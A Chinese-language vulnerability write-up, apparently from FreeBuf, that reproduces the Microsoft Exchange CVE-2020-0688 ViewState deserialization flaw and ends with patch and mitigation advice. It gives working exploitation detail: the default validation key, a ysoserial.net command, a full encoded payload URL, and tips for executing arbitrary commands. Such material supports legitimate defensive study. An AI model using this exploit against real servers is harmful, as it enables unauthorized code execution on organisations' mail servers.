**近日网络公开了一个编号为CVE-2020-0688的Microsoft Exchange
Server远程代码执行漏洞，丁牛安全团队对该漏洞进行了模拟复现，分析了该漏洞成因及利用，希望可以帮助企业了解该漏洞的危害，及时修复漏洞远离黑客攻击。**

## 影响版本

> Microsoft Exchange Server 2010 Service Pack 3
>
> Microsoft Exchange Server 2013
>
> Microsoft Exchange Server 2016
>
> Microsoft Exchange Server 2019

## 漏洞原理

这个漏洞是由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的。

具体来说，与正常软件安装每次都会产生随机密钥不同，所有Exchange
Server在安装后的web.config文件中都拥有相同的validationKey和decryptionKey。这些密钥用于保证ViewState的安全性。而ViewState是ASP.NET
Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。攻击者可以在ExchangeControl
Panel web应用上执行任意.net代码。

当攻击者通过各种手段获得一个可以访问Exchange Control Panel
（ECP）组件的用户账号密码时。攻击者可以在被攻击的exchange上执行任意代码，直接获取服务器权限。

## 复现过程

### 1、需要变量

想要利用该漏洞，我们需要四个参数，分别为：

> \--validationkey =
> CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）
>
> \--validationalg = SHA1（默认，漏洞产生原因）
>
> \--generator=B97B4E27（基本默认）
>
> \--viewstateuserkey = ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）

在这四个变量中，前两个为默认固定，viewstateuserkey和generator的值需要从经过身份验证的session中收集。viewstateuserkey可以从ASP.NET的_SessionID
cookie中获取，而generator可以在一个隐藏字段__VIEWSTATEGENERATOR中找到。所有这些都可以通过浏览器中的工具轻松获取。

### 2、获取viewstateuserkey和generator值

在正常登录后访问 /ecp/default.aspx
页面。使用F12开发者工具的Network选项，刷新页面重新发送请求，找到登录时/ecp/default.aspx的原始响应。

在Headers选项卡找到ASP.NET_SessionId的cookie：

![](https://image.3001.net/images/20200229/1582949491_5e59e473b3dd2.png!small)

在Response选项卡搜索__VIEWSTATEGENERATOR获取字段值：

![](https://image.3001.net/images/20200229/1582949469_5e59e45db1f8e.png!small)

如果未找到此字段不必慌张，直接使用默认值B97B4E27 即可。

### 3、使用工具生成payload

使用ysoserial.net工具生成反序列化payload。
工具下载地址：<https://github.com/pwntester/ysoserial.net/>

生成payload命令：

    
    
    ysoserial.exe-p ViewState -g TextFormattingRunProperties -c "calc.exe"--validationalg="SHA1"--validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF"--generator="B97B4E27" --viewstateuserkey="d673d1a4-1794-403e-ab96-e283ca880ef2"--isdebug --islegacy

### 4、构造攻击地址

在生成完payload代码后，需要对该代码进行URL Encode编码构造一个URL

    
    
    /ecp/default.aspx?__VIEWSTATEGENERATOR=<generator>&__VIEWSTATE=<ViewState>

将最开始获得的__VIEWSTATEGENERATOR值替换<generator>，将URL Encode编码后的payload替换<ViewState>。

示例：

>
> [https://192.168.1.248/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuM**wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuR**ybWF0dGluZy5UZXh0R**ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVnc**1bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljc**zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4Lp73ado0NJN2PSSnfOoN9h4H7xCU%3D](https://192.168.1.248/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuM**wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuR**ybWF0dGluZy5UZXh0R**ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVnc**1bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljc**zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4Lp73ado0NJN2PSSnfOoN9h4H7xCU%3D)

### 5、访问地址并成功执行

访问构造好的URL地址，服务器会弹出500的错误，但攻击其实成功了。

![](https://image.3001.net/images/20200228/1582904673_5e593561d4aa0.png!small)

登录服务器查看进程，发现计算器成功启动。

![](https://image.3001.net/images/20200228/1582904083_5e5933131e18a.png!small)

## 其他问题

### 1、关于版本

网上一些说法该漏洞对大版本的小版本有限制。其实不是这样的，应该是全版本通杀的。本人测试环境server 12 + exchange
2013。测试过15.0.516.32（2012
年12月3日）和15.0.1497.2（2019年6月18日）也就是update23，均存在漏洞，可以复现成功，16,19未测试，应该差不多。

### 2、__VIEWSTATEGENERATOR

在最初版本的时候一直没有这个参数（确实不重要，基本为默认值），造成这一问题的主要原因是没有更新系统补丁KB2919355，更新该补丁后就会出现__VIEWSTATEGENERATOR字段。

### 3、无法创建文件

大部分复现者只复现到启动计算器，但是却无法创建文件。但经过测试发现问题出在ysoserial.exe的-c参数上，虽然在演示过程中可以直接-c "echo
OOOPS!!! > c:/Vuln_Server.txt"创建文件，让人误以为-c是在cmd窗口下运行，但是实际上-c实际为“运行”的内容，因此直接echo是不行的，需要-c "cmd /c echo test > C:\1.txt"，经测试成功创建文件，如图所示：

![](https://image.3001.net/images/20200228/1582904930_5e59366262c14.png!small)

### 4、URL Encode编码

对生成的payload编码时，需要注意只编码关键的特殊字符即可，如果全编码的话会无法利用成功。

## 修复建议

### 1、建议及时更新相关补丁

产品| 文章| 下载  
---|---|---  
Microsoft Exchange Server 2010 Service Pack 3更新汇总30|
[4536989](https://support.microsoft.com/help/4536989)|
[安全更新](https://www.microsoft.com/download/details.aspx?familyid=4d072d3e-153e-4a5a-859e-ad054fe24107)  
Microsoft Exchange Server 2013累积更新23|
[4536988](https://support.microsoft.com/help/4536988)|
[安全更新](https://www.microsoft.com/download/details.aspx?familyid=ddba43d0-f66d-410d-a421-bb26e45d64b7)  
Microsoft Exchange Server 2016累积更新14|
[4536987](https://support.microsoft.com/help/4536987)|
[安全更新](https://www.microsoft.com/download/details.aspx?familyid=5ae7346b-f59c-415d-b576-e50f6b493a23)  
Microsoft Exchange Server 2016累积更新15|
[4536987](https://support.microsoft.com/help/4536987)|
[安全更新](https://www.microsoft.com/download/details.aspx?familyid=a4bd9a4e-56f4-42c2-b0d7-fffe52c5dbe5)  
Microsoft Exchange Server 2019累积更新3|
[4536987](https://support.microsoft.com/help/4536987)|
[安全更新](https://www.microsoft.com/download/details.aspx?familyid=dec0d147-8b43-4fee-94cb-ed43ed1226ad)  
Microsoft Exchange Server 2019累积更新4|
[4536987](https://support.microsoft.com/help/4536987)|
[安全更新](https://www.microsoft.com/download/details.aspx?familyid=6f5e2305-f1dc-4ce9-97c5-4d6fc1b87a24)  
  
### 2、限制Exchange Control Panel （ECP）组件页面访问权限

由于该漏洞需要利用Exchange Control Panel
（ECP）组件，因此禁止此组件访问也不失为一个较为有效的应急方法，建议条件允许的情况下及时更新补丁。

 ***本文作者：GFinger 和 pt007，转载请注明来自FreeBuf.COM。**

